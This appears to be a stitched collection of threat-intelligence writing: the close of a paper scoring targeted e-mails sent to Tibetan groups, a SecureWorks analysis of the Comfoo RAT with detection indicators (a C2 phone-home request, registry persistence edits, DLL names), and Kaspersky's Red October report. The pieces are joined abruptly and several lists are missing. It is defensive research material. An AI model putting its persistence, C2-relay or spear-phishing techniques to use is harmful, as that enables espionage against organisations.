In ongoing work we are continuing our collection of e- mails and NIDS alerts as well as monitoring other attacks against these groups ( e.g. , waterhole attacks and DoS at- tacks ) to understand how threats vary based on their de- livery mechanism .
We are also working to extend our methodology to more diverse CSO communities such as those in Latin America , Africa , and other underreported regions to better document the politically motivated dig- ital threats they may be experiencing .
This work was supported by the John D. and Catherine T. MacArthur Foundation .
We are grateful to Jakub Dalek , Sarah McKune , and Justin Wong for research assistance .
We thank the USENIX Security reviewers and our shep- herd Prof . J. Alex Halderman for helpful comments and guidance .
We are especially grateful to the groups who participated in our study .
References Figure 6 : Example of e - mail with Targeting Score 1 Figure 7 : Example of e - mail with Targeting Score 2 A Examples of targeted e - mails In this section , we provide speciﬁc examples of e - mails that would be assigned targeting scores described in Sec- tion 4.2.2 .
Targeting Score 1 ( Targeted Not customized ) .
The e- mail in Figure 6 was sent to Tibet group 1 .
The message content and sender are vague and do not relate to the in- terest of the group .
The attachment is a word document implanted with malware .
The lack of relevant informa- tion in this message gives it a score of 1 ( targeted , not customized ) .
Targeting Score 2 ( Targeted , Poorly Customized ) .
The e - mail in Figure 7 was sent to Tibet group 1 .
It refer- ences Tibetan self - immolations which is an issue of inter- est to the group .
However , the sender does not appear to be from a real person or organization .
The message con- tent is terse and does not referenced information that can be externally validated .
Therefore this message scores a 2 ( targeted , poorly customized ) .
The e- mail in Figure 8 was sent to Tibet group 2 .
On the sur- face it appears to be a professional e - mail from `` Palden Sangpo '' a consultant at the Tibet Career Centre .
The e - mail sender address and signature reference accurate contact details that can be easily veriﬁed through an In- ternet search .
However , the e - mail headers reveal the purported e - mail sender address is fraudulent and the actual sender was albano_kuqo @ gmx.com .
The e - mail generally addresses the organization rather than the indi- vidual recipient .
Therefore this message scores a 3 ( tar- geted , customized ) .
Targeting Score 4 ( Targeted Personalized ) .
The e- mail in Figure 9 was sent to Tibet group 1 .
It is directly addressed to the director of the group and appears to come from Mr. Cheng Li , a prominent China scholar based at the Brookings Institute .
The e - mail address is made to appear to be from Mr. Cheng Li , but from an AOL account ( chengli.brookings @ aol.com ) that was registered by the attackers .
The message asks the recip- ient for information on recent Tibetan self - immolations .
The level of customization and personalization used in Figure 9 : Example of e - mail with Targeting Score 4 this message gives it a score of 4 ( targeted , personalized ) .
Targeting Score 5 ( Targeted Highly Personalized ) .
Targeting scores of 5 ( targeted , highly personalized ) re- quire reference to internal information to the target orga- nization that could not be obtained through open sources .
Examples of messages scoring at this level include an e - mail that purported to come from a funder of China Group 3 that provided details of an upcoming meeting the group actually had scheduled with the funder .
In another example , Tibet Group 2 and Tibet Group 3 re- ceived separate e - mails that contained speciﬁc personal details about a South African group 's visit to Dharam- sala , India that appear to have been repurposed from a real private communication .
The malicious attachment contained an authentic travel itinerary , which would be displayed after the user opened the document .
The pri- vate information used in these messages suggest that the attackers performed signiﬁcant reconnaissance of these groups and likely obtained the information through prior compromise .
Author : Joe Stewart and Don Jackson , Dell SecureWorks Counter Threat Unit ( TM ) Threat Intelligence Date : 31 July 2013 URL : http : //www.secureworks.com / cyber - threat - intelligence / threats / secrets - of- the - comfoo - masters/ The details of organized cyber - espionage campaigns are becoming more public .
So- called `` Advanced Persistent Threat '' ( APT ) attacks are common news as individuals and corporations discover the data on their hard drives is part of a country or competitor 's '' shopping list .
The missions of APT threat actors are usually of strategic importance , and the actors exercise virtually unlimited patience in penetrat- ing and persisting inside their specific target 's network until they accomplish their goals .
One of the universal aspects of APT attacks is the use of malicious software tools that grant unauthorized backdoor access to computer systems inside the targeted network .
Because maintaining a beachhead inside the network is often critical to mission success , threat actors must adapt to various network configurations and changes in defenses by choosing and deploying backdoors with specific functionality and features .
It is difficult to be persistent without at least one backdoor .
Threat actors often possess and use an ar- senal of remote access trojans ( RATs ) to siphon data from their targets .
Persistence re- quires malware , and the top cyber - espionage actors have hundreds of RATs at their dis- posal at any given time .
Understanding the choice and usage of tools can be the keys to identifying and tracking APTs .
Dell SecureWorks researchers have identified and classified more than 200 distinct mal- ware families used by various APT groups .
Some malware is specially configured off- the - shelf software , and some malware is customized source code of an existing RAT .
However , most malware families are proprietary , developed by the APT groups as weapons to be deployed against a variety of targets .
Accurate identification and classifi- cation of this malware by antivirus ( AV ) companies is sparse .
Shared code , the use of common tools , co - infections , and a history of generic or incorrect classification by multi- ple names make the automated tracking of these tools by AV companies difficult .
This inaccuracy can be detrimental when designing defenses based on specific threat indica- tors .
Tracking APTs requires a dedicated malware intelligence effort .
One way applied malware intelligence is used to discover new APT trojans is a recursive investigative method : Malware - > Infrastructure Touchpoints - > New Malware - > and so on .
Cyber - espionage actors often cycle through different RATs over a period of years .
The Dell SecureWorks Counter Threat Unit™ ( CTU ) research team has tracked a RAT known as `` Comfoo '' that has been in continuous development since at least 2006 .
This RAT has maintained a fairly low profile , even though it was used as part of the RSA breach in 2010 , when its code was first analyzed .
Antivirus firm Trend Micro briefly mentioned its use in a 2012 paper titled `` Luckycat Redux - Inside an APT Campaign with Multiple Targets in India and Japan .
To maintain persistence on the system , Comfoo usually replaces the path to the DLL of an existing unused service rather than installing a new service .
A new service is more likely to be noticed by system audits .
Sometimes Comfoo is delivered with a rootkit that hides Comfoo 's files on disk .
Additionally , Comfoo starts the existing `` ipnat '' system ser- vice .
This action causes remote inbound connections to the infected system to fail , block- ing remote maintenance by the network administrator .
Comfoo 's network traffic is encrypted and encapsulated in HTTP requests and respons- es , although some variants skip the encapsulation step .
Payloads are encrypted by a 10- byte static XOR key that is hard - coded inside the Comfoo binary .
Initial login data from the infected system ( MAC address , internal IP address , campaign tag , and version data ) is passed in the request URI and is additionally encrypted by a dynamic key , as shown in Figure 1 .
Figure 1 .
Comfoo URL decryption algorithm example .
However , the rest of the HTTP headers do not match the order or the formatting used by this version of Apache .
This anomaly sug- gests that the C2 software was a standalone application instead of a series of scripts run- ning under Apache .
Searching for the specific server version string in the CTU malware repository produced a sample of the Comfoo server software , identified by the MD5 hash 2b29f0224b632fdd00d0a30527b795b7 .
Analysis The Comfoo C2 server turns out to be a rendezvous - type traffic relay program .
This small binary can be deployed on rented or hacked Windows systems , where it passes traffic between Comfoo victims and the Comfoo master console operated by the threat actors ( see Figure 2 ) .
Figure 2 .
Organization of rendezvous - type traffic relay program .
Instead , the master console program connects to the relay server on - demand , and any incoming victim data is passed to the master console connection .
Likewise , the administrator can add other layers of proxies or VPN connections to the console connection side of the communication .
The Comfoo relay server listens on up to three TCP ports at a time .
The first port acts as a control and typically listens on port 1688 .
It performs the following tasks : Enables / disables the other ports Accepts new relay port configuration ( stored in rlycfg.dll ) Notifies master console that a new victim connection is available The second port is the admin relay port , which typically listens on port 1689 .
It accepts connections from the master console to send commands to and receive data from vic- tims ' systems .
The third port is the victim relay port , which listens on a configurable port number , usually port 80 or port 443 .
This port accepts connections from victims ' systems to send data to and receive commands from the Comfoo administrator encapsu- lated in HTTP requests and responses .
If there is no current connection between the vic- tim and the Comfoo administrator , Comfoo logs the victim 's connection and sends an idle response to the victim .
Like many other APT malware families , Comfoo reaches out to its masters based on DNS lookups of certain hostnames .
The Comfoo operators commonly use dy- namic DNS providers to micromanage the IP addresses to which Comfoo hostnames re- solve .
While Comfoo sleeps , its operators often set those IP addresses to common or bo- gus entries .
When not being used to actively control Comfoo , the C2 domain name might resolve to the address of a popular search engine or a local loopback ( 127.0.0.1 ) , private ( 10.1.1.1 ) , or other special use ( 0.0.0.0 ) IP address .
Domain names used in Com- foo operations only point to actual control infrastructure during very short time win- dows .
Only during these time windows do alerts from a DNS monitoring tool inform researchers when it might be possible to locate an actual Comfoo server .
Figure 3 maps IP addresses used in Comfoo campaigns .
Figure 3 .
Geolocation plot of all public routable IP addresses resolved from a set of Comfoo C2 hostnames , including bogus distractors .
Figure 4 .
Geolocation plot of actual IP addresses used for Comfoo C2 servers .
Researchers can passively monitor victims ' lo- gins to the relay servers ( sending no commands ) by connecting to the correct port on the correct IP address at the right time .
This technique is analogous to viewing webserver log data stored in a publicly accessible directory on a C2 server .
To help identify and notify victims of Comfoo - based espionage , CTU researchers set up a passive monitoring system for dozens of active Comfoo C2 relays and have been run- ning this system since January 2012 .
Connections from the monitoring system are peri- odic , so not all victim logins are observed .
Only the initial connection data is logged , and it is not possible to see data being exfiltrated from victims ' networks using this method .
Passive monitoring results While monitoring Comfoo , CTU researchers detected more than 200 variants of the tro- jan and 64 different campaign tags used by the threat actors to organize their cam- paigns .
Numerous government entities and private companies based in the United States , Europe , and Asia Pacific had Comfoo - infected computers phoning home to the Comfoo C2 infrastructure ( see Figure 5 ) .
Figure 5 .
Geographic location of Comfoo victim organizations .
The following industries were also targeted : Education Energy Mineral exploration News media Semiconductors Steel manufacturing Think tanks Telecommunications Trade organizations Audio and videoconferencing products The targeting of audio and videoconferencing products is unusual .
Another possibility is that it could be a clever and stealthy way of listening and watching activities of both commercial and government organiza- tions .
The presence of Comfoo on a network or computer can be detected in a variety of ways , even if AV engines lack detection for the latest variants .
Analysts can search for known Comfoo threat indicators in network traffic , on hard drives , in memory , or in the Win- dows registry .
Network detection A typical Comfoo HTTP phone - home request looks like the following : GET /CWoNaJLBo / VTNeWw11212/12664/12VTNfNmM1aQ / UTWOqVQ132/ HTTP/1.1Accept : image / gif , image / x - xbitmap , image / jpeg , image / pjpeg , * /*Accept - Language : en - enUser - Agent : Mozilla/4.0 ( compatible ; MSIE 6.0 ; Windows NT 5.1 ) Host : smtp.dynami‐ clink.ddns.usConnection : Keep - AliveCache - Control : no - cache An active C2 server responds with headers similar to the following : HTTP/1.1 200 OKDate : Mon , 29 Jul 2013 19:26:15 GMTServer : Apache/2.0.50 ( Unix ) Content - Length : 10Keep - Alive : timeout=15 , max=90 Disk / memory / registry detection The unique string T1Y943jIhk can be found in the Comfoo binary .
Offline forensic analy- sis may be required to search for this string if a rootkit is in play .
These additional strings can be searched but are not guaranteed to be unique to Com- foo : CPUSpeed : % d. % dGHz CPUNameString : % s CPUVendorIdentifier : % s CPUIdentifier : % s No % d CPU Information : SystemCurrent Time : systemBoot Time : IE BHO Name : % s 11 .
Protocol Information ! 6 .
Disk Information ! 4 .
Account Information ! 3 .
System Time ! 2 .
Windows Version Information ! Additionally , Comfoo uses the SetEvent Windows API and registers an event that fre- quently contains the word `` GAME '' .
The following are example Comfoo event names : exclusiveinstance12 THIS324NEWGAME MYGAMEHAVESTART MYGAMEHAVEstarted MYGAMEHAVESTARTEd MYGAMEHAVESTARTED thisisanewfirstrun THISISASUPERNEWGAMENOWBEGIN thisisnewtrofor024 To persist without adding new registry entries , Comfoo edits an unused system service configuration , replacing the DLL path and setting it to auto - start on boot .
For example , a system service registry key entry changed by Comfoo might resemble the following : system\CurrentControlSet\Services\Netman\Parameters Original : `` ServiceDll '' = > `` % SystemRoot % \System32\netman.dll '' Modified : `` ServiceDll '' = > `` C : \WINDOWS\system32\tabcteng.dll '' system\CurrentControlSet\Services\Netman Original : `` Start '' = > `` 3 '' Modified : `` Start '' = > `` 2 '' Comfoo hijacks service settings for some legitimate service DLLs : netman.dll rasauto.dll sens.dll The following are DLL names commonly used by Comfoo : cmmos.dll jacpet.dll javadb.dll mszlobm.dll netfram.dll netman.dll ntdapie.dll ntdelu.dll ntobm.dll odbm.dll senss.dll suddec.dll tabcteng.dll vmmreg32.dll wininete.dll If Comfoo successfully connects to the relay server and receives commands from the master console , then it creates a file named `` mstemp.temp '' on the infected system to store the output of the last shell command .
Comfoo is the tip of an iceberg .
The CTU research team notified many Comfoo victims , either directly or through the computer security incident response teams ( CSIRTs ) in their respective country .
Analysis was also shared with law enforcement .
Based on the number of campaign tags observed in malware samples versus those seen in live moni- toring by the CTU research team , there are likely hundreds more unidentified victims .
Most businesses will never see a Comfoo infection .
However , evaluating whether an or- ganization is a potential target of cyber - espionage is important in any risk evaluation .
Chief information security officers should maintain awareness of any reported cyber- espionage threats in their business sector .
If one player in an industry is targeted , it is likely all major players ( or newcomers with interesting technology ) in that industry will be targets at some point .
Organizations compromised by Comfoo ( or most types of APT malware ) likely face a major forensic and eradication effort .
This effort should be followed by a major invest- ment in security measures to keep cyber - espionage actors out of the network .
Many in- house security teams do not have the APT expertise to respond to a persistent threat that requires a persistent , active , and layered defense model spanning the entire attack surface of an organization .
As a result , the organization might need outside expertise to effectively mitigate these types of threats .
Appendix : Comfoo hostnames for blacklisting consideration accounts .
The `` Red October '' Campaign - An Advanced Cyber Espionage Network Targeting Diplomatic and Government Agencies Here 's a link to the full paper ( part 1 ) about our Red October research .
During the next days , we 'll be publishing Part 2 , which contains a detailed technical analysis of all the known modules .
Please stay tuned .
During the past five years , a high - level cyber - espionage campaign has successfully infiltrated computer networks at diplomatic , governmental and scientific research organizations , gathering data and intelligence from mobile devices , computer systems and network equipment .
Kaspersky Lab 's researchers have spent several months analyzing this malware , which targets specific organizations mostly in Eastern Europe , former USSR members and countries in Central Asia , but also in Western Europe and North America .
The campaign , identified as `` Rocra '' , short for `` Red October '' , is currently still active with data being sent to multiple command - and - control servers , through a configuration which rivals in complexity the infrastructure of the Flame malware .
Registration data used for the purchase of C & C domain names and PE timestamps from collected executables suggest that these attacks date as far back as May 2007 .
Some key findings from our investigation : The attackers have been active for at least five years , focusing on diplomatic and governmental agencies of various countries across the world .
Information harvested from infected networks is reused in later attacks .
For example , stolen credentials were compiled in a list and used when the attackers needed to guess passwords and network credentials in other locations .
To control the network of infected machines , the attackers created more than 60 domain names and several server hosting locations in different countries ( mainly Germany and Russia ) .
The C & C infrastructure is actually a chain of servers working as proxies and hiding the location of the true -mothership- command and control server .
The attackers created a multi - functional framework which is capable of applying quick extension of the features that gather intelligence .
The system is resistant to C & C server takeover and allows the attacker to recover access to infected machines using alternative communication channels .
Beside traditional attack targets ( workstations ) , the system is capable of stealing data from mobile devices , such as smartphones ( iPhone , Nokia , Windows Mobile ) ; dumping enterprise network equipment configuration ( Cisco ) ; hijacking files from removable disk drives ( including already deleted files via a custom file recovery procedure ) ; stealing e - mail databases from local Outlook storage or remote POP / IMAP server ; and siphoning files from local network FTP servers .
We have observed the use of at least three different exploits for previously known vulnerabilities : CVE-2009 - 3129 ( MS Excel ) , CVE-2010 - 3333 ( MS Word ) and CVE-2012 - 0158 ( MS Word ) .
The earliest known attacks used the exploit for MS Excel and took place in 2010 and 2011 , while attacks targeting the MS Word vulnerabilities appeared in the summer of 2012 .
The exploits from the documents used in spear phishing were created by other attackers and employed during different cyber attacks against Tibetan activists as well as military and energy sector targets in Asia .
The only thing that was changed is the executable which was embedded in the document ; the attackers replaced it with their own code .
Sample fake image used in one of the Rocra spear phishing attacks .
During lateral movement in a victim 's network , the attackers deploy a module to actively scan the local area network , find hosts vulnerable for MS08 - 067 ( the vulnerability exploited by Conficker ) or accessible with admin credentials from its own password database .
Another module used collected information to infect remote hosts in the same network .
Based on registration data of the C & C servers and numerous artifacts left in executables of the malware , we strongly believe that the attackers have Russian - speaking origins .
Current attackers and executables developed by them have been unknown until recently , they have never related to any other targeted cyber attacks .
Notably , one of the commands in the Trojan dropper switches the codepage of an infected machine to 1251 before installation .
This is required to address files and directories that contain Cyrillic characters in their names .
What is Rocra ? Where does the name come from ? Was Operation Rocra targeting any specific industries , organizations or geographical regions ? Rocra ( short for `` Red October '' ) is a targeted attack campaign that has been going on for at least five years .
It has infected hundreds of victims around the world in eight main categories : 1 .
Government 2 .
Diplomatic / embassies 3 .
Research institutions 4 .
Trade and commerce 5 .
Nuclear / energy research 6 .
Oil and gas companies 7 .
Aerospace 8 .
Military It is quite possible there are other targeted sectors which have n't been discovered yet or have been attacked in the past .
How and when was it discovered ? We have come by the Rocra attacks in October 2012 , at the request of one of our partners .
By analysing the attack , the spear phishing and malware modules , we understood the scale of this campaign and started dissecting it in depth .
Who provided you with the samples ? Our partner who originally pointed us to this malware prefers to remain anonymous .
How many infected computers have been identified by Kaspersky Lab ? How many victims are there ? What is the estimated size of Operation Red October on a global scale ? During the past months , we ' ve counted several hundreds of infections worldwide - all of them in top locations such as government networks and diplomatic institutions .
The infections we ' ve identified are distributed mostly in Eastern Europe , but there are also reports coming from North America and Western European countries such as Switzerland or Luxembourg .
Based on our Kaspersky Security Network ( KSN ) here 's a list of countries with most infections ( only for those with more than 5 victims ) : For the sinkhole statistics see below .
Who is behind / responsible for this operation ? Is this a nation - state sponsored attack ? The information we have collected so far does not appear to point towards any specific location , however , two important factors stand out : The exploits appear to have been created by Chinese hackers .
The Rocra malware modules have been created by Russian - speaking operatives .
Currently , there is no evidence linking this with a nation - state sponsored attack .
The information stolen by the attackers is obviously of the highest level and includes geopolitical data which can be used by nation states .
Such information could be traded in the underground and sold to the highest bidder , which can be of course , anywhere .
Are there any interesting texts in the malware that can suggest who the attackers are ? Several Rocra modules contain interesting typos and mis - spellings : network_scanner : `` SUCCESSED '' , `` Error_massage '' , `` natrive_os '' , `` natrive_lan '' imapispool : `` UNLNOWN_PC_NAME '' , `` WinMain : error CreateThred stop '' mapi_client : `` Default Messanger '' , `` BUFEER IS FULL '' msoffice_plugin : `` my_encode my_dencode '' winmobile : `` Zakladka injected '' , `` Can not inject zakladka , Error : % u '' PswSuperMailRu : `` -- -- -- -PROGA START -- -- - '' , `` -- -- -- -PROGA END -- -- - '' The word `` PROGA '' used in here might refer to transliteration of Russian slang `` ПРОГА '' , which literally means an application or a program among Russian - speaking software engineers .
In particular , the word `` Zakladka '' in Russian can mean : `` bookmark '' ( more likely ) a slang term meaning `` undeclared functionality '' , i.e .
However , it may also mean a microphone embedded in a brick of the embassy building .
The C++ class that holds the C & C configuration parameters is called `` MPTraitor '' and the corresponding configuration section in the resources is called `` conn_a '' .
Some examples include : What kind of information is being hijacked from infected machines ? Information stolen from infected systems includes documents with extensions : txt , csv , eml , doc , vsd , sxw , odt , docx , rtf , pdf , mdb , xls , wab , rst , xps , iau , cif , key , crt , cer , hse , pgp , gpg , xia , xiu , xis , xio , xig , acidcsa , acidsca , aciddsk , acidpvr , acidppr , acidssa .
In particular , the `` acid * '' extensions appear to refer to the classified software `` Acid Cryptofiler '' , which is used by several entities such as the European Union and/or NATO .
What is the purpose / objective of this operation ? What were the attackers looking for by conducting this sustained cyber - espionage campaign for so many years ? The main purpose of the operation appears to be the gathering of classified information and geopolitical intelligence , although it seems that the information gathering scope is quite wide .
During the past five years , the attackers collected information from hundreds of high profile victims although it 's unknown how the information was used .
It is possible that the information was sold on the black market , or used directly .
What are the infection mechanisms for the malware ? Does it have self - propagating ( worm ) capabilities ? How does it work ? Do the attackers have a customized attack platform ? The main malware body acts as a point of entry into the system which can later download modules used for lateral movement .
After initial infection , the malware wo n't propagate by itself - typically , the attackers would gather information about the network for a few days , identify key systems and then deploy modules which can compromise other computers in the network , for instance by using the MS08 - 067 exploit .
In general , the Rocra framework is designed for executing `` tasks '' that are provided by its C & C servers .
Most of the tasks are provided as one - time PE DLL libraries that are received from the server , executed in memory and then immediately discarded .
Several tasks however need to be constantly present in the system , i.e .
These tasks are provided as PE EXE files and are installed in the infected machine .
Examples of `` one - time '' tasks The Rocra framework was designed by the attackers from scratch and has n't been used in any other operations .
Was the malware limited to only workstations or did it have additional capabilities , such as a mobile malware component ? Several mobile modules exist , which are designed to steal data from several types of devices : These modules are installed in the system and wait for mobile devices to be connected to the victim 's machine .
When a connection is detected , the modules start collecting data from the mobile phones .
How many variants , modules or malicious files were identified during the overall duration of Operation Red October ? During our investigation , we ' ve uncovered over 1000 modules belonging to 30 different module categories .
These have been created between 2007 with the most recent being compiled on 8th Jan 2013 .
Here 's a list of known modules and categories : Were initial attacks launched at select `` high - profile '' victims or were they launched in series of larger ( wave ) attacks at organizations / victims ? All the attacks are carefully tuned to the specifics of the victims .
For instance , the initial documents are customized to make them more appealing and every single module is specifically compiled for the victim with a unique victim ID inside .
Later , there is a high degree of interaction between the attackers and the victim - the operation is driven by the kind of configuration the victim has , which type of documents the use , installed software , native language and so on .
Compared to Flame and Gauss , which are highly automated cyberespionage campaigns , Rocra is a lot more `` personal '' and finely tuned for the victims .
Is Rocra related in any way to the Duqu , Flame and Gauss malware ? Simply put , we could not find any connections between Rocra and the Flame / Tilded platforms .
How does Operation Rocra compare to similar campaigns such as Aurora and Night Dragon ? Any notable similarities or differences ? Compared to Aurora and Night Dragon , Rocra is a lot more sophisticated .
During our investigation we 've uncovered over 1000 unique files , belonging to about 30 different module categories .
Generally speaking , the Aurora and Night Dragon campaigns used relatively simple malware to steal confidential information .
With Rocra , the attackers managed to stay in the game for over 5 years and evade detection of most antivirus products while continuing to exfiltrate what must be hundreds of Terabytes by now .
How many Command & Control servers are there ? Did Kaspersky Lab conduct any forensic analysis on them ? During our investigation , we uncovered more than 60 domain names used by the attackers to control and retrieve data from the victims .
The domain names map to several dozen IPs located mostly in Russia and Germany .
Here 's an overview of the Rocra 's command and control infrastructure , as we believe it looks from our investigations : More detailed information about the Command and Control servers will be revealed at a later date .
Did you sinkhole any of the Command & Control servers ? We were able to sinkhole six of the over 60 domains used by the various versions of the malware .
During the monitoring period ( 2 Nov 2012 - 10 Jan 2013 ) , we registered over 55,000 connections to the sinkhole .
The number of different IPs connecting to the sinkhole was 250 .
From the point of view of country distribution of connections to the sinkhole , we have observed victims in 39 countries , with most of IPs being from Switzerland .
Kazakhstan and Greece follow next .
Sinkhole statistics - 2 Nov 2012 - 10 Jan 2013 Is Kaspersky Lab working with any governmental organizations , Computer Emergency Response Teams ( CERTs ) , law enforcement agencies or security companies as part of the investigation and disinfection efforts ? Kaspersky Lab , in collaboration with international organizations , Law Enforcement , Computer Emergency Response Teams ( CERTs ) and other IT security companies is continuing its investigation of Operation Red October by providing technical expertise and resources for remediation and mitigation procedures .
Kaspersky Lab would like to express their thanks to : US - CERT , the Romanian CERT and the Belarusian CERT for their assistance with the investigation .
If you are a CERT and would like more information about infections in your country , please contact us at theflame @ kaspersky.com .
Here 's a link to the full paper ( part 1 ) about our Red October research .
During the next days , we 'll be publishing Part 2 , which contains a detailed technical analysis of all the known modules .
Please stay tuned .
Contents In October 2012 , Kaspersky Lab 's Global Research & Analysis Team initiated a new threat research after a series of attacks against computer networks of various international diplomatic service agencies .
A large scale cyber - espionage network was revealed and analyzed during the investigation , which we called `` Red October '' ( after famous novel `` The Hunt For The Red October '' ) .
This report is based on detailed technical analysis of a series of targeted attacks against diplomatic , governmental and scientific research organizations in different countries , mostly related to the region of Eastern Europe , former USSR members and countries in Central Asia .
The main objective of the attackers was to gather intelligence from the compromised organizations , which included computer systems , personal mobile devices and network equipment .
The earliest evidence indicates that the cyber - espionage campaign was active since 2007 and is still active at the time of writing ( January 2013 ) .
Besides that , registration data used for the purchase of several Command & Control ( C & C ) servers and unique malware filenames related to the current attackers hints at even earlier time of activity dating back to May 2007 .
Advanced Cyber - espionage Network : The attackers have been active for at least several years , focusing on diplomatic and governmental agencies of various countries across the world .
Information harvested from infected networks was reused in later attacks .
For example , stolen credentials were compiled in a list and used when the attackers needed to guess secret phrase in other locations .
To control the network of infected machines , the attackers created more than 60 domain names and several server hosting locations in different countries ( mainly Germany and Russia ) .
The C & C infrastructure is actually a chain of servers working as proxies and hiding the location of the ' mothership ' control server .
Unique architecture : The attackers created a multi - functional kit which has a capability of quick extension of the features that gather intelligence .
The system is resistant to C & C server takeover and allows the attack to recover access to infected machines using alternative communication channels .
Broad variety of targets : Beside traditional attack targets ( workstations ) , the system is capable of stealing data from mobile devices , such as smartphones ( iPhone , Nokia , Windows Mobile ) , enterprise network equipment ( Cisco ) , removable disk drives ( including already deleted files via a custom file recovery procedure ) .
Importation of exploits : The samples we managed to find were using exploit code for vulnerabilities in Microsoft Word and Microsoft Excel that were created by other attackers and employed during different cyber attacks .
The attackers left the imported exploit code untouched , perhaps to harden the identification process .
Attacker identification : Basing on registration data of C & C servers and numerous artifacts left in executables of the malware , we strongly believe that the attackers have Russian - speaking origins .
Current attackers and executables developed by them have been unknown until recently , they have never related to any other targeted cyberattacks .
General description These attacks comprised of the classical scenario of specific targeted attacks , consisting of two major stages : 1 .
Initial infection 2 .
Additional modules deployed for intelligence gathering The malicious code was delivered via e - mail as attachments ( Microsoft Excel , Word and , probably PDF documents ) which were rigged with exploit code for known security vulnerabilities in the mentioned applications .
In addition to Office documents ( CVE-2009 - 3129 , CVE-2010 - 3333 , CVE-2012 - 0158 ) , it appears that the attackers also infiltrated victim network ( s ) via Java exploitation ( known as the ' Rhino ' exploit ( CVE-2011 - 3544 ) .
Right after the victim opened the malicious document or visit malicious URL on a vulnerable system , the embedded malicious code initiated the setup of the main component which in turn handled further communication with the C & C servers .
Next , the system receives a number of additional spy modules from the C & C server , including modules to handle infection of smartphones .
The main purpose of the spying modules is to steal information .
This includes files from different cryptographic systems , such as `` Acid Cryptofiler '' , ( see https : //fr.wikipedia.org / wiki / Acid_Cryptofiler ) which is known to be used in organizations of European Union / European Parliament / European Commission since the summer of 2011 .
All gathered information is packed , encrypted and only then transferred to the C & C server .
Step - by - step description ( 1st stage ) During our investigation we could n't find any e - mails used in the attacks , only top level dropper documents .
Nevertheless , based on indirect evidence , we know that the e - mails can be sent using one of the following methods : Using an anonymous mailbox from a free public email service provider Using mailboxes from already infected organizations E - mail subject lines as well as the text in e - mail bodies varied depending on the target ( recipient ) .
The attached file contained the exploit code which activated a Trojan dropper in the system .
We have observed the use of at least three different exploits for previously known vulnerabilities : CVE- 2009 - 3129 ( MS Excel ) , CVE-2010 - 3333 ( MS Word ) and CVE-2012 - 0158 ( MS Word ) .
The first attacks that used the exploit for MS Excel started in 2010 , while attacks targeting the MS Word vulnerabilities appeared in the summer of 2012 .
As a notable fact , the attackers used exploit code that was made public and originally came from a previously known targeted attack campaign with Chinese origins .
The only thing that was changed is the executable which was embedded in the document ; the attackers replaced it with their own code .
The embedded executable is a file - dropper , which extracts and runs three additional files .
This is required to address files and directories that contain Cyrillic characters in their names .
The `` LHAFD.GCP '' file is encrypted with RC4 and compressed with the `` Zlib '' library .
This file is essentially a backdoor , which is decoded by the loader module ( svchost.exe ) .
The decrypted file is injected into system memory and is responsible for communication with the C & C server .
On any infected system , every major task is performed by the main backdoor component .
The main component is started only after its loader ( `` svchost.exe '' ) checks if the internet connection is available .
It does so by connecting to three Microsoft hosts : update.microsoft.com www.microsoft.com support.microsoft.com After the Internet connection is validated , the loader executes the main backdoor component that connects to its C & C servers : The connections with the C & C are encrypted - different encryption algorithms are used to send and receive data .
During our investigation , we found more than 60 different command - and - control domains .
Each malware sample contains three such domains , which are hardcoded inside the main backdoor component : Step - by - step description ( 2nd stage ) After a connection with the C & C server is established , the backdoor starts the communication process , which leads to the loading of additional modules .
These modules can be split into two categories : `` offline '' and `` online '' .
The main difference between these categories is their behavior on the infected system : `` Offline '' : exists as files on local disk , capable of creating its own system registry keys , local disk log files , and may communicate with C & C servers on their own .
There is a notable module among all others , which is essentially created to be embedded into Adobe Reader and Microsoft Office applications .
The main purpose of its code is to create a foolproof way to regain access to the target system .
The module expects a specially crafted document with attached executable code and special tags .
The document may be sent to the victim via e - mail .
It will not have an exploit code and will safely pass all security checks .
However , like with exploit case , the document will be instantly processed by the module and the module will start a malicious application attached to the document .
This trick can be used to regain access to the infected machines in case of unexpected C & C servers shutdown / takeover .
We have identified over 1000 different malicious files related to over 30 modules of this Trojan kit .
Most of them were created between May 2010 and October 2012 .
There were 115 file - creation dates identified which are related to these campaigns via emails during the last two and a half years .
Concentration of file creation dates around a particular day may indicate date of the massive attacks ( which was also confirmed by some of our side observations ) : Year 2010 19.05.2010 21.07.2010 04.09.2010 Year 2011 05.01.2011 14.03.2011 05.04.2011 23.06.2011 06.09.2011 21.09.2011 Year 2012 12.01.2012 Below is a list of sample attachment filenames that were sent to some of the victims : File name : Katyn_-_opinia_Rosjan.xls FIEO contacts update.xls spisok sotrudnikov.xls List of shahids.xls Spravochnik.xls Telephone.xls BMAC Attache List - At 11 Oct_v1 [ 1 ] .XLS
Programme de fetes 2011.xls 12 05 2011 updated.xls telefonebi.xls We used two approaches to identify targets for these attacks .
First , we used the Kaspersky Security Network ( KSN ) and then we set up our own sinkhole server .
The data received using two independent ways was correlating and this confirmed objective findings .
The attackers used already detected exploit codes and because of this , in the beginning of the research we already had some statistics of detections with our anti - malware software .
We searched for similar detections for the period of 2011 - 2012 .
That is how we discovered more than 300 unique systems , which had detected at least one module of this Trojan kit .
Once again , this is based on data from Kaspersky AV products .
Apparently , real number and list of victim names is much larger than mentioned above .
During our analysis , we uncovered more than 60 different domains used by different variants of the malware .
Out of the list of domains , several were expired so we registered them to evaluate the number of victims connecting to them .
The following domains have been registered and sinkholed by Kaspersky Lab : All the sinkholed domains currently point to `` 95.211.172.143 '' , which is Kasperskys ' sinkhole server .
During the monitoring period ( 2- Nov 2012 - 10 Jan 2013 ) , we registered over 55,000 connections to the sinkhole .
The most popular domain is `` dll-host-update.com '' , which is receiving most of the traffic .
From the point of view of country distribution of connections to the sinkhole , we have observed victims in 39 countries , with most of IPs being from Switzerland .
Kazakhstan and Greece follow next .
Interestingly , when connecting to the sinkhole , the backdoors submit their unique victim ID , which allows us to separate the multiple IPs per victims .
Based on the traffic received to our sinkhole , we created the following list of unique victim IDs , countries and possible profiles : In some cases , it is possible to create a profile of the victim based on the IP address ; in most of the cases , however , the identity of the victim remains unknown .
Some of the victim organizations were identified using IP addresses and public WHOIS information or remote system names .
Most `` interesting '' out of those are : A list of the most popular domains used for command and control can be found below : Interestingly , although the domain `` dll-host-update.com '' appears in one of the malware configurations , it had not been registered by the attackers .
The domain has since been registered by Kaspersky Lab on Nov 2nd , 2012 to monitor the attacker 's activities .
Another interesting example is `` dll-host-udate.com '' - the `` udate '' part appears to be a typo .
All the domains used by attackers appear to have been registered between 2007 - 2012 .
The oldest known domain was registered in Nov 2007 ; the newest on May 2012 .
